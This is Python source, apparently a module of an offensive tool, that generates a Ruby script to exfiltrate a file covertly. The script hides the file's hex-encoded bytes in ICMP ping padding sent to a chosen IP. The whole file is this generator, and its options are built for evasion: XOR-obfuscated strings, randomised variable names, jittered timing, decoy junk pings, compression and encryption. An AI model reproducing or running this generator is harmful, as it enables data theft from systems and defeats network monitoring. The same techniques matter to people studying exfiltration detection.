import random

from ..obfuscation import xor_key, xor_encode


def _ruby_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    ruby_file = file_path.replace("\\", "\\\\").replace("'", "\\'")

    template = """require 'digest/sha2'
$stdout.sync=true
f='__FILE__';ip='__IP__';p=__PERIOD__;rd=__RDELAY__
c=12;ib=3;r=5;t=2
data=File.binread(f)
hsh=Digest::SHA256.hexdigest(data)
hex=data.unpack1('H*')
dsz=data.bytesize
tot=(dsz+c-1)/c
abort "[-] File too large" if tot>2**(8*ib)
if rd!=0;puts "[+] Sending '#{f}' (#{dsz} bytes) to '#{ip}' in #{tot} pings every (#{p} +- #{rd}) s"
elsif p!=0;puts "[+] Sending '#{f}' (#{dsz} bytes) to '#{ip}' in #{tot} pings every #{p} s"
else;puts "[+] Sending '#{f}' (#{dsz} bytes) to '#{ip}' in #{tot} pings"
end
$stderr.puts "[!] WARNING: random-delay (#{rd} s) > period (#{p} s)" if rd>p
ls=false;t0=Time.now.to_f
tot.times do |i|
idx='%06x'%i
chunk=hex[i*24,24]||''
pat=idx+chunk
ok=false
r.times do
if ls
if rd!=0;sl=p+(rand*2-1)*rd;sl=0 if sl<0;sleep(sl)
elsif p!=0;sleep(p)
end
end
ls=true
sz=pat.length/2
if system("ping -c 1 -W #{t} -s #{sz} -p '#{pat}' '#{ip}' >/dev/null 2>&1");ok=true;break;end
end
abort "[-] No reply for ping #{i}, transfer aborted" unless ok
s=i+1
if p!=0||rd!=0
el=Time.now.to_f-t0
eh=(el/3600).to_i;em=((el%3600)/60).to_i;es=(el%60).to_i
by=s*c;by=dsz if by>dsz
pct=(100*s/tot).to_i
$stdout.print "\\r  #{s}/#{tot} pings, #{by}/#{dsz} bytes, #{pct}%%, elapsed %02d:%02d:%02d"%[eh,em,es]
if rd==0&&s>0
rm=(el*(tot-s)/s).to_i;rh=(rm/3600).to_i;rmm=((rm%3600)/60).to_i;rss=rm%60
$stdout.print ", remaining ~%02d:%02d:%02d"%[rh,rmm,rss]
end
elsif s%100==0;puts "  #{s}/#{tot}"
end
end
puts ""
puts "="*50
puts " "*21+"DONE"
puts "="*50+""
puts "[*] SHA-256: #{hsh}"
"""

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_block = (
            "_k=[" + key_str + "]\n"
            "_d=->h{(0...h.length/2).map{|i|(h[i*2,2].to_i(16))^_k[i%_k.length]}.map(&:chr).join}\n"
        )
        script = script.replace(
            "f='__FILE__';ip='__IP__';",
            decode_block + "f=_d.('__XFILE__');ip=_d.('__XIP__');"
        )
    if compress:
        script = script.replace(
            "require 'digest/sha2'\n",
            "require 'digest/sha2'\nrequire 'zlib'\n"
        )
        script = script.replace(
            "hex=data.unpack1('H*')\n",
            "osz=data.bytesize\n"
            "data=Zlib::Deflate.new(Zlib::DEFAULT_COMPRESSION,Zlib::MAX_WBITS|16).deflate(data,Zlib::FINISH)\n"
            "csz=data.bytesize\n"
            "puts \"[*] Compressed: #{osz} -> #{csz} bytes (#{'%.1f'%(100.0*csz/osz)}%)\"\n"
            "hex=data.unpack1('H*')\n"
        )
    if encrypt:
        ruby_pass = passphrase.replace("\\", "\\\\").replace("'", "\\'")
        script = script.replace(
            "require 'digest/sha2'\n",
            "require 'digest/sha2'\nrequire 'open3'\n"
        )
        if obfuscate_strings:
            pp_line = "pp=_d.('__XPP__')\n"
        else:
            pp_line = "pp='__PP_VALUE__'\n"
        encrypt_code = (
            pp_line +
            "eout,st=Open3.capture2('openssl','enc','-" + encrypt + "','-pbkdf2','-iter','10000','-md','sha256','-pass',\"pass:#{pp}\",stdin_data:data)\n"
            "data=eout\n"
            "puts \"[*] Encrypted with " + encrypt + "\"\n"
        )
        script = script.replace(
            "hex=data.unpack1('H*')\n",
            encrypt_code + "hex=data.unpack1('H*')\n"
        )
    if junk > 0:
        script = script.replace(
            'c=12;ib=3;r=5;t=2',
            f'c=12;ib=3;r=5;t=2;j={junk}'
        )
        if randomize_junk:
            junk_data = "jd='ff'+File.open('/dev/urandom','rb'){|ur|ur.read(14)}.unpack1('H*')\n"
        else:
            junk_data = "jd='ffffff'+File.open('/dev/urandom','rb'){|ur|ur.read(12)}.unpack1('H*')\n"
        junk_code = (
            "j.times do\n" +
            junk_data +
            "if ls\n"
            "if rd!=0;sl=p+(rand*2-1)*rd;sl=0 if sl<0;sleep(sl)\n"
            "elsif p!=0;sleep(p)\n"
            "end\n"
            "end\n"
            "ls=true\n"
            "system(\"ping -c 1 -W #{t} -s 15 -p '#{jd}' '#{ip}' >/dev/null 2>&1\")\n"
            "end\n"
        )
        script = script.replace("s=i+1\n", "s=i+1\n" + junk_code)
    if estimate:
        est_lines = (
            "puts \"[!] ESTIMATE OPTION ENABLED \\xe2\\x80\\x94 the file will NOT be transferred\"\n"
            "puts \"[*] File size (after processing): #{dsz} bytes\"\n"
            "puts \"[*] Data pings: #{tot}\"\n"
        )
        if junk > 0:
            est_lines += (
                "puts \"[*] Junk pings: #{tot*j}\"\n"
                "puts \"[*] Total pings: #{tot*(1+j)}\"\n"
            )
            total_expr = "tot*(1+j)"
        else:
            est_lines += "puts \"[*] Total pings: #{tot}\"\n"
            total_expr = "tot"
        est_lines += (
            "if p!=0\n"
            "et=" + total_expr + "*p;h=(et/3600).to_i;m=((et%3600)/60).to_i;ss=et.to_i%60\n"
            "puts \"[*] Estimated time: ~%02d:%02d:%02d\"%[h,m,ss]\n"
            "end\n"
            "puts \"[*] SHA-256: #{hsh}\"\n"
            "exit 0\n"
        )
        script = script.replace("ls=false;t0=Time.now.to_f\n", est_lines)

    if randomize:
        import re
        var_names = [
            'f', 'ip', 'p', 'rd',
            'c', 'ib', 'r', 't',
            'data', 'hsh', 'hex', 'dsz', 'tot',
            'ls', 't0', 'i', 'idx', 'chunk', 'pat', 'ok',
            'sl', 'sz', 's',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if compress:
            var_names.extend(['osz', 'csz'])
        if encrypt:
            var_names.extend(['pp', 'eout', 'st'])
        if junk > 0:
            var_names.extend(['j', 'jd'])
        if estimate:
            var_names.extend(['et', 'h', 'm', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        ruby_reserved = {'do', 'if', 'in', 'or', 'def', 'end', 'for', 'nil', 'and', 'not', 'puts', 'then', 'else', 'true', 'false', 'File', 'Time', 'Zlib', 'Open3'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in ruby_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            if len(old_name) == 1:
                pattern = r'(?<![-\\])\b' + re.escape(old_name) + r'\b'
            else:
                pattern = r'\b' + re.escape(old_name) + r'\b'
            script = re.sub(pattern, mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
    else:
        script = (script
                  .replace('__FILE__', ruby_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', ruby_pass)

    return script
